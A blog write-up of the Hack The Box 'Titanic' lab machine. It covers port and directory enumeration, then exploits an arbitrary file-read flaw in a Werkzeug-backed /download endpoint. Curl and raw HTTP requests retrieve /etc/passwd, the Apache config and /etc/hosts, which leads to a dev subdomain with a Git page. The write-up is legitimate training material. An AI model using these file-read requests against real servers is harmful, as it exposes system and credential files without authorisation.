---
layout: post
title: 'Hack The Box - Machine Write-Up: Titanic'
created-at: 2025-02-20
categories: ["Hack The Box", "WriteUp", "Cybersecurity"]
---

## Enumeration and Analysis

> nmap 10.10.11.55

for average discovery. And for more detail on found ports:

```
> nmap -p22,80 -sC -sV 10.10.11.55   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 13:57 EST
Nmap scan report for 10.10.11.55
Host is up (0.73s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```

So, it looks like there is a HTTP and a SSH server running.

First access to the HTTP page directly through the IP address resulted in a redirect to `titanic.htb`, but the name couldn't be solved:

![Titanic Unresolved Landing Page](/docs/assets/2025-02/htb-titanic-1.png)

Adding the entry `10.10.11.55    titanic.htb` to `/etc/hosts` solves the issue:

![Titanic Resolved Landing Page](/docs/assets/2025-02/htb-titanic-2.png)

The only option that does something is the "Book Now"  or "Book Your Trip", both resulting in the same form modal where you can input your information:

![Titanic Ticket booking form](/docs/assets/2025-02/htb-titanic-3.png)

This results in a JSON file being downloaded with your information. This is supposed to be the "ticket":

```json
{"name": "aaa", "email": "aaa@aaa.com", "phone": "568", "date": "2025-02-20", "cabin": "Standard"}
```

I then proxied the browser through `Burp Suite`, and could see on the response headers that the back-end is running on Python using a library called [Werkzeug](https://werkzeug.palletsprojects.com/en/stable/).

```
HTTP/1.1 302 FOUND
Date: Thu, 20 Feb 2025 19:04:23 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: text/html; charset=utf-8
Content-Length: 303
Location: /download?ticket=3a9220f2-862d-42ac-be2a-0cf076df835a.json
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/download?ticket=3a9220f2-862d-42ac-be2a-0cf076df835a.json">/download?ticket=3a9220f2-862d-42ac-be2a-0cf076df835a.json</a>. If not, click the link.
```

I then searched "Werkzeug/3.0.3 Python/3.10.12" on Google and found this website: [werkzeug vulnerabilities](https://security.snyk.io/package/pip/werkzeug).

It lists a series of known vulnerabilities on Werkzeug, one of them being a [directory traversal that wasn't yet patched on 3.0.3 version](https://security.snyk.io/vuln/SNYK-PYTHON-WERKZEUG-8309091).

I then used `gobuster` to get a list of known paths that the application exposes:

```
> gobuster dir -u http://titanic.htb/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://titanic.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/book                 (Status: 405) [Size: 153]
/download             (Status: 400) [Size: 41]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The obvious one for me is the `download` path, since it probably executes a file open to retrieve and return the file to the client.

I then messed around with it for a bit, trying different path levels, but it turned out that no back level was required at all:

```
> curl --path-as-is http://titanic.htb/download?ticket=/etc/passwd | grep /bin/bash 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1951  100  1951    0     0  14395      0 --:--:-- --:--:-- --:--:-- 14451
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

I then started going through known sensitive and configuration files from Apache and the system itself.

> Around this time I realized that requests done through `Burp Suite` repeated were easier to track and analyze than using the terminal.

I was able to locate the Apache config file:

```
GET /download?ticket=/etc/apache2/sites-enabled/000-default.conf HTTP/1.1
...
<VirtualHost *:80>
    ServerName titanic.htb
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ProxyRequests Off
    ProxyPass / http://127.0.0.1:5000/
    ProxyPassReverse / http://127.0.0.1:5000/

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    
    
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^titanic.htb$
    RewriteRule ^(.*)$ http://titanic.htb$1 [R=permanent,L]
</VirtualHost>
```

It looks like the application is running on port `5000` and that Apache `/` is redirecting to it.

I then looked into the machine's hosts file:

```
GET /download?ticket=/etc/hosts HTTP/1.1
...
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

It looks like there is a exposed `dev.` subdomain for the application 🤔.

Adding the entry `10.10.11.55    dev.titanic.htb` to `/etc/hosts` I was able to get:


![Titanic Dev Page](/docs/assets/2025-02/htb-titanic-4.png)

Looks like there is an exposed Git repository page 🤯.